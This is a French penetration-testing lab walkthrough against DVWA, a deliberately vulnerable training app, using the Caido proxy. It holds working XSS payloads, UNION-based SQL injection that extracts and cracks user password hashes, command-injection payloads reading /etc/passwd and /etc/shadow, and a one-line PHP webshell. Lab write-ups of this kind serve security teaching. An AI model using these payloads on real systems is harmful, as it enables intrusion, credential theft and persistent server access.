# Guide de Test de Pénétration DVWA avec Caido

---

## Configuration initiale

### Installation de Caido

```bash
# Télécharger depuis https://caido.io
# Installation sur macOS avec Brave Browser
brew install --cask brave-browser
```

### Configuration du certificat CA dans Brave

1. **Télécharger le certificat depuis Caido**
   - Ouvrir Caido → Settings → Certificate
   - Cliquer sur "Download CA Certificate"
   - Sauvegarder `caido.pem`

2. **Installer le certificat sur macOS**
   - Double-cliquer sur `caido.pem`
   - Keychain Access s'ouvre
   - Double-cliquer sur "Caido CA"
   - Section "Trust" → "When using this certificate" → **"Always Trust"**

3. **Configurer le proxy dans Brave**
   - Brave Settings → System → Proxy settings
   - HTTP/HTTPS Proxy: `127.0.0.1:8080`

### Lancer le navigateur intégré de Caido

- Cliquer sur l'icône Chrome en haut à droite de Caido
- Sélectionner le navigateur installé
- Un navigateur pré-configuré se lance automatiquement

---

## Test XSS (Cross-Site Scripting)

### Cible
```
http://192.168.0.70:8000/vulnerabilities/xss_r/
```

### Payloads XSS testés

#### Payload basique
```html
<script>alert('XSS')</script>
```

URL encodée:
```
http://192.168.0.70:8000/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
```

#### Utilisation avec Caido Automate

1. **Créer une liste de payloads**
   ```html
   <script>alert('XSS')</script>
   <img src=x onerror=alert('XSS')>
   <svg/onload=alert('XSS')>
   <body onload=alert('XSS')>
   "><script>alert('XSS')</script>
   ```

2. **Configurer Automate**
   - Envoyer la requête vers Automate
   - Définir le paramètre à fuzzer: `name`
   - Importer la liste de payloads
   - Lancer l'attaque

3. **Visualiser les résultats**
   - **Option A**: Clic droit → "View Response in Browser"
   - **Option B**: Copier l'URL et la coller dans le navigateur intégré de Caido

### Notes importantes

⚠️ L'URL `caido://requests/59/replay/...` est une URL interne à Caido et ne fonctionne pas dans un navigateur standard.

Pour tester les XSS:
- Utiliser le navigateur intégré de Caido (icône Chrome)
- Ou copier l'URL HTTP réelle dans un navigateur configuré avec le proxy

---

## SQL Injection

### Cible
```
http://192.168.0.70:8000/vulnerabilities/sqli/
```

### Code vulnérable (PHP)

```php
<?php
if( isset( $_REQUEST[ 'Submit' ] ) ) {
    $id = $_REQUEST[ 'id' ];
    
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
    
    while( $row = mysqli_fetch_assoc( $result ) ) {
        $first = $row["first_name"];
        $last  = $row["last_name"];
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }
}
?>
```

**Vulnérabilité**: Le paramètre `$id` est directement inséré dans la requête SQL sans sanitization.

### Étape 1: Tester la vulnérabilité

```sql
-- Payload de test
2' OR '1'='1
```

### Étape 2: Déterminer le nombre de colonnes

```sql
-- Test ORDER BY pour trouver le nombre de colonnes
2' ORDER BY 1#
2' ORDER BY 2#
2' ORDER BY 3#
```

Si `ORDER BY 3` retourne une erreur → **2 colonnes** dans le SELECT.

### Étape 3: Tester UNION SELECT

```sql
-- Vérifier que UNION fonctionne
2' UNION SELECT 1,2#
```

### Étape 4: Extraire les tables de la base de données

```sql
-- Liste toutes les tables
2' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema=database()#
```

**Résultat obtenu:**
- `users`
- `guestbook`

### Étape 5: Extraire les colonnes de la table "users"

```sql
-- Liste les colonnes de la table users
2' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'#
```

**Colonnes trouvées:**
- `user_id`
- `first_name`
- `last_name`
- `user` 
- `password` 
- `avatar`
- `last_login`
- `failed_login`

### Étape 6: Extraire les credentials

```sql
-- Extraire les utilisateurs et mots de passe
2' UNION SELECT user,password FROM users#
```

**Credentials extraits:**

| User    | Password Hash (MD5)              |
|---------|----------------------------------|
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 |

**Observation**: `admin` et `smithy` ont le même hash → même mot de passe.

### Étape 7: Extraire la table "guestbook"

#### Lister les colonnes

```sql
2' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='guestbook'#
```

**Colonnes:**
- `comment_id`
- `comment`
- `name`

#### Extraire les données

```sql
-- Extraire tous les commentaires
2' UNION SELECT name,comment FROM guestbook#
```

**Résultat:**
```
test dit: This is a test comment.
```

#### Version condensée avec GROUP_CONCAT

```sql
2' UNION SELECT 1,GROUP_CONCAT(name,' dit: ',comment SEPARATOR ' | ') FROM guestbook#
```

### Tentative de lecture de fichiers système

#### Test LOAD_FILE (échec attendu)

```sql
2' UNION SELECT 1,LOAD_FILE('/etc/passwd')#
```

**Résultat**: Échec - L'utilisateur `app@localhost` n'a pas le privilège FILE.

#### Vérification des privilèges

```sql
-- Vérifier l'utilisateur actuel
2' UNION SELECT 1,user()#
-- Résultat: app@localhost

-- Vérifier les bases de données
2' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata#
-- Résultat: dvwa,information_schema
```

### Cracker les hashes MD5

**Outils recommandés:**

1. **Online** (rapide):
   - https://crackstation.net/
   - https://md5decrypt.net/

2. **Hashcat** (local):
   ```bash
   echo "5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt
   hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
   ```

3. **John the Ripper**:
   ```bash
   echo "admin:5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt
   john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
   ```
   
| User    | Password Hash (MD5)              | Password |
|---------|----------------------------------|----------|
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123   |
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | charley  |
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein  |
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | password |


---

## Command Injection

### Cible
```
http://192.168.0.70:8000/vulnerabilities/exec/
```

### Code vulnérable (concept)

```php
<?php
if( isset( $_POST[ 'Submit' ] ) ) {
    $target = $_REQUEST[ 'ip' ];
    
    // Vulnérabilité: exécution directe sans sanitization
    $cmd = shell_exec( 'ping -c 4 ' . $target );
    
    echo '<pre>' . $cmd . '</pre>';
}
?>
```

**Vulnérabilité**: Le paramètre `ip` est directement passé à `shell_exec()` sans validation.

### Méthodologie avec Caido

1. **Capturer la requête**
   - Soumettre une IP normale: `127.0.0.1`
   - Trouver la requête dans HTTP History
   - Clic droit → "Send to Replay" (`Ctrl+R`)

2. **Modifier le payload**
   - Remplacer l'IP par un payload d'injection

3. **Envoyer et analyser**
   - Cliquer sur "Send"
   - Observer la réponse

### Payloads de Command Injection

#### Payload 1: Opérateur && (ET logique)

```bash
192.168.0.70 && cat /etc/passwd
```

**URL encodé:**
```
192.168.0.70%20%26%26%20cat%20%2Fetc%2Fpasswd
```

**Explication**: Exécute `ping`, puis si succès, exécute `cat /etc/passwd`.

#### Payload 2: Point-virgule ; (séparateur de commandes)

```bash
192.168.0.70; cat /etc/passwd
```

**URL encodé:**
```
192.168.0.70%3B%20cat%20%2Fetc%2Fpasswd
```

**Explication**: Exécute `ping`, puis exécute `cat /etc/passwd` indépendamment du résultat.

#### Payload 3: Pipe | (redirection)

```bash
192.168.0.70 | cat /etc/passwd
```

**URL encodé:**
```
192.168.0.70%20%7C%20cat%20%2Fetc%2Fpasswd
```

**Explication**: Redirige la sortie de `ping` vers `cat /etc/passwd`.

#### Payload 4: Substitution de commande

```bash
`cat /etc/passwd`
$(cat /etc/passwd)
```

### Résultat obtenu

**Requête:**
```
ip=192.168.0.70%20%26%26%20cat%20%2Fetc%2Fpasswd&Submit=Submit
```

**Réponse (extrait):**
```
PING 192.168.0.70 (192.168.0.70): 56 data bytes
64 bytes from 192.168.0.70: icmp_seq=0 ttl=64 time=0.692 ms
...
--- 192.168.0.70 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
```

 **Succès!** Le contenu de `/etc/passwd` a été lu.

### Commandes d'exploration supplémentaires

#### Identifier l'utilisateur actuel

```bash
192.168.0.70 && whoami
192.168.0.70 && id
```

#### Explorer le système de fichiers

```bash
192.168.0.70 && ls -la /var/www/html
192.168.0.70 && pwd
192.168.0.70 && ls -la /home
```

#### Lire des fichiers sensibles

```bash
192.168.0.70 && cat /etc/shadow
192.168.0.70 && cat /etc/hosts
192.168.0.70 && cat /var/www/html/config/config.inc.php
```

#### Chercher des fichiers de configuration

```bash
192.168.0.70 && find /var/www -name "*.conf" 2>/dev/null
192.168.0.70 && find /var/www -name "config*.php" 2>/dev/null
```

### Obtenir un shell interactif

#### Créer un webshell

```bash
192.168.0.70 && echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
```

**Accès:**
```
http://192.168.0.70:8000/shell.php?cmd=whoami
http://192.168.0.70:8000/shell.php?cmd=cat%20/etc/passwd
```


---

## Résumé des Vulnérabilités Exploitées

| Type | Cible | Résultat |
|------|-------|----------|
| **XSS Reflected** | `/vulnerabilities/xss_r/` | Payload `<script>alert('XSS')</script>` exécuté |
| **SQL Injection** | `/vulnerabilities/sqli/` | Extraction de credentials MD5 |
| **SQL Injection** | `/vulnerabilities/sqli/` | Extraction table `guestbook` |
| **SQL Injection** | `/vulnerabilities/sqli/` | LOAD_FILE bloqué (pas de privilège FILE) |
| **Command Injection** | `/vulnerabilities/exec/` | Lecture de `/etc/passwd` |

---

## Ressources

### Documentation Caido
- Site officiel: https://caido.io
- Documentation: https://docs.caido.io
- Labs pratiques: https://labs.cai.do

### Références OWASP
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

### Outils de cracking
- CrackStation: https://crackstation.net/
- Hashcat: https://hashcat.net/hashcat/
- John the Ripper: https://www.openwall.com/john/

### Wordlists
- SecLists: https://github.com/danielmiessler/SecLists
- RockYou: `/usr/share/wordlists/rockyou.txt` (Kali Linux)

---

## Bonnes pratiques avec Caido

### Organisation des tests

1. **Créer des Collections** dans Replay pour organiser vos requêtes par type de vulnérabilité
2. **Utiliser des environnements variables** pour stocker des valeurs réutilisables (IP cible, tokens, etc.)
3. **Nommer les Sessions** de manière descriptive (ex: "DVWA-SQLi-users-table")

### Workflow efficace

```
1. HTTP History → Identifier la requête intéressante
2. Send to Replay (Ctrl+R) → Tester manuellement
3. Send to Automate → Fuzzing automatisé
4. View Response in Browser → Vérifier l'exécution (XSS)
```

### Fonctionnalités utiles

- **HTTPQL**: Filtrer rapidement les requêtes (ex: `path:"sqli" AND status:200`)
- **Match & Replace**: Modifier automatiquement certaines valeurs
- **Workflows**: Automatiser l'encodage/décodage
- **Built-in Browser**: Tester sans configuration de proxy manuelle



